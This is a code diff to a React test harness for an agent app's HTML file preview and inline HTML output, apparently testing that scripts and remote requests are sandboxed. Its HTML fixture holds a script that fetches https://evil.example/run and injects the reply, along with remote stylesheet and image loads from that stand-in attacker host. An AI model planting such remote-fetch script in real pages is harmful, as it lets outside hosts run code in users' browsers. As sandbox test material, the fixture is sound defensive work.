@@ -5,6 +5,7 @@ import type { AgentFilePreviewV1 } from '../../src/contracts/generated/agent-fil
 import { AgentFileBlock } from '../../src/features/agent/file-preview/AgentFileBlock';
 import { FilePreviewHost } from '../../src/features/agent/file-preview/FilePreviewHost';
 import type { FilePreviewRequest } from '../../src/features/agent/file-preview/file-descriptor';
+import { InlineHtmlOutput } from '../../src/features/agent/timeline/InlineHtmlOutput';
 import { MockControlTransport } from '../../src/test/mock-transport';
 import '../../src/design/tokens.css';
 import '../../src/design/typography.css';
@@ -45,11 +46,12 @@ const files: PreviewFixture[] = [
     mediaId: 'media_previewhtml01', sessionId, expectedSha256: 'e'.repeat(64),
     fileNameHint: 'acceptance-report.html', mimeTypeHint: 'text/html', byteSizeHint: 0,
     kind: 'html', language: '',
-    content: '<!doctype html><html><head><style>body{background:#fff}.remote{background:url(https://evil.example/bg.png)}</style><script>fetch("https://evil.example/run")</script></head><body><h1>静态验收报告</h1><p id="result">脚本与网络已隔离。</p><img src="https://evil.example/image.png"><form action="https://evil.example"><button>提交</button></form></body></html>',
+    content: '<!doctype html><html><head><link rel="stylesheet" href="https://evil.example/theme.css"><style>body{background:#fff}.remote{min-height:24px;background:url(https://evil.example/bg.png)}</style><script>addEventListener("DOMContentLoaded",async()=>{const response=await fetch("https://evil.example/run");document.querySelector("#result").textContent=await response.text()})</script></head><body><h1>交互验收报告</h1><p id="result">正在运行脚本…</p><div class="remote">远程样式区域</div><img alt="远程验收图" src="https://evil.example/image.png"><form><label>备注 <input aria-label="报告备注" value="初始值"></label><button type="button" onclick="document.querySelector(\'#result\').textContent=document.querySelector(\'input\').value">更新报告</button></form></body></html>',
   },
 ];
 
 const byMediaId = new Map(files.map((file) => [file.mediaId, file]));
+const inlineHtml = '<section><h2>页内 HTML 已渲染</h2><label>页内备注 <input aria-label="页内报告备注" value="初始页内值"></label><button type="button" onclick="document.querySelector(\'h2\').textContent=document.querySelector(\'input\').value">更新页内报告</button></section>';
 const transport = new MockControlTransport({
   routes: {
     'agent.media.preview': (request) => {
@@ -78,6 +80,7 @@ createRoot(document.getElementById('root')!).render(
             sessionId={sessionId}
           />
         ))}
+        <InlineHtmlOutput content={inlineHtml} />
       </section>
       <FilePreviewHost />
     </ControlTransportProvider>
